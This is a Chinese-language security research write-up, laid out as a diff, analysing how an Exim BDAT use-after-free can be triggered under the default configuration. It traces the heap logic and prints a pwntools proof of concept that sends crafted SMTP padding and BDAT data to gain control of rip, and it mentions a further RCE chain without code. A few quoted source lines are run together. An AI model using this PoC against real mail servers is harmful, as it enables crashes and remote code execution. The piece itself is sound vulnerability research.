@@ -1,0 +1,102 @@
+作者：[Hcamael@知道创宇404实验室](http://0x48.pw) 英文版本：
+[上一篇分析](https://paper.seebug.org/469/
+"上一篇分析")出来后，经过@orange的提点，得知了meh公布的PoC是需要特殊配置才能触发，所以我上一篇分析文章最后的结论应该改成，在默认配置情况下，meh提供的PoC无法成功触发uaf漏洞。之后我又对为啥修改了配置后能触发和默认情况下如何触发漏洞进行了研究
+#### 重新复现漏洞
+比上一篇分析中复现的步骤，只需要多一步，注释了`/usr/exim/configure`文件中的`control =
+dkim_disable_verify`
+然后调整下poc的padding，就可以成功触发UAF漏洞，控制rip
+##### 分析特殊配置下的触发流程
+在代码中有一个变量是`dkim_disable_verify`, 在设置后会变成`true`，所以注释掉的情况下，就为默认值`false`,
+然后再看看`receive.c`中的代码：
+    BOOL
+    receive_msg(BOOL extract_recip)
+    {
+    ......
+    1733：if (smtp_input && !smtp_batched_input && !dkim_disable_verify)
+    1734：  dkim_exim_verify_init(chunking_state  pdkim_init_verify -> ctx->linebuf = store_get(PDKIM_MAX_BODY_LINE_LEN);
+    bdat_getc -> smtp_getc -> smtp_refill -> dkim_exim_verify_feed -> pdkim_feed -> string_catn -> string_get -> store_get(0x64)
+    #define PDKIM_MAX_BODY_LINE_LEN     16384       //0x4000
+在上一篇文章中说过了，无法成功触发uaf漏洞的原因是，被free的堆处于堆顶，释放后就和top chunk合并了。
+在注释了dkim的配置后，在`dkim_exim_verify_init` 函数的流程中，执行了一个`store_get`
+函数，申请了一个0x4000大小的堆，然后在`dkim_exim_verify_init` 函数和`dkim_exim_verify_feed`
+函数中，都有如下的代码：
+    store_pool = POOL_PERM;
+    ......
+    store_pool = dkim_verify_oldpool;
+    ---------------    enum { POOL_MAIN, POOL_PERM, POOL_SEARCH };
+`store_pool`全局变量被修改为了1，之前说过了，exim自己实现了一套堆管理，当`store_pool`不同时，相当于对堆进行了隔离，不会影响`receive_msg`
+函数中使用堆管理时的`current_block`这类的堆管理全局变量
+当dkim相关的代码执行结束后，还把`store_pool`恢复回去了
+因为申请了一个0x4000大小的堆，大于0x2000，所以申请之后`yield_length`全局变量的值变为了0，导致了之后`store_get(0x64)`再次申请了一块堆，所以有了两块堆放在了heap1的上面，释放heap1后，heap1被放入了unsortbin，成功触发了uaf漏洞，造成crash。(之前的文章中都有写到)
+##### 默认配置情况下复现漏洞
+在特殊配置情况下复现了漏洞后，又进行了如果在默认配置情况下触发漏洞的研究。
+在@explorer大佬的教导下，发现了一种在默认情况下触发漏洞的情况。
+其实触发的关键点，就是想办法在heap1上面再malloc一个堆，现在我们从头来开始分析
+    // daemon.c
+    137 static void
+    138 handle_smtp_call(int *listen_sockets, int listen_socket_count,
+    139  int accept_socket, struct sockaddr *accepted)
+    140 {
+    ......
+    348 pid = fork();
+    352 if (pid == 0)
+    353   {
+    ......
+    504     if ((rc = smtp_setup_msg()) > 0)
+    505       {
+    506       BOOL ok = receive_msg(FALSE);
+    ......
+首先，当有新连接进来的时候，fork一个子进程，然后进入上面代码中的那个分支，`smtp_setup_msg`函数是用来接收命令的函数，我们先发一堆无效的命令过去(padding)，控制`yield_length`的值小于0x100，目的上一篇文章说过了，因为命令无效，流程再一次进入了`smtp_setup_msg`
+这时候我们发送一个命令`BDAT 16356`
+然后有几个比较重要的操作：
+    5085       if (sscanf(CS smtp_cmd_data, "%u %n", &chunking_datasize, &n)  0)
+    547     return lwr_receive_getc(chunking_data_left--);
+`lwr_receive_getc=smtp_getc`通过该函数获取16356个字符串
+首先，我们发送16352个a作为padding，然后执行了下面这流程:
+  * store_extend return 0 -> store_get -> store_release
+先申请了一个0x4010的heap2，然后释放了长度为0x2010的heap1
+然后发送`:\r\n`，进入下面的代码分支:
+    1902   if (ch == '\r')
+    1903     {
+    1904     ch = (receive_getc)(GETC_BUFFER_UNLIMITED);
+    1905     if (ch == '\n')
+    1906       {
+    1907       if (first_line_ended_crlf == TRUE_UNSET) first_line_ended_crlf = TRUE;
+    1908       goto EOL;
+    1909       }
+跳到了EOL，最重要的是最后几行代码：
+    2215   header_size = 256;
+    2216   next = store_get(sizeof(header_line));
+    2217   next->text = store_get(header_size);
+    2218   ptr = 0;
+    2219   had_zero = 0;
+    2220   prevlines_length = 0;
+    2221   }      /* Continue, starting to read the next header */
+把一些变量重新进行了初始化，因为之前因为padding执行了`store_get(0x4000)`，所以这个时候`yield_length=0`
+这个时候再次调用store_get将会申请一个0x2000大小堆，从unsortbin中发现heap1大小正好合适，所以这个时候得到的就是heap1，在heap1的顶上有一个之前`next->text`使用，大小0x4010，未释放的堆。
+之后流程的原理其实跟之前的差不多，PoC如下：
+    r = remote('localhost', 25)
+    r.recvline()
+    r.sendline("EHLO test")
+    r.recvuntil("250 HELP")
+    r.sendline("MAIL FROM:")
+    r.recvline()
+    r.sendline("RCPT TO:")
+    r.recvline()
+    # raw_input()
+    r.sendline('a'*0x1300+'\x7f')
+    # raw_input()
+    r.recvuntil('command')
+    r.sendline('BDAT 16356')
+    r.sendline("a"*16352+':\r')
+    r.sendline('aBDAT \x7f')
+    s = 'a'*6 + p64(0xabcdef)*(0x1e00/8)
+    r.send(s+ ':\r\n')
+    r.recvuntil('command')
+    #raw_input()
+    r.send('\n')
+##### exp
+根据该CVE作者发的文章，得知是利用文件IO的fflush来控制第一个参数，然后通过堆喷和内存枚举来来伪造vtable，最后跳转到`expand_string`函数来执行命令，正好我最近也在研究ctf中的`_IO_FILE`的相关利用(之后应该会写几篇这方面相关的blog)，然后实现了RCE，结果图如下：
+#### 参考链接
+  1. 
+* * *
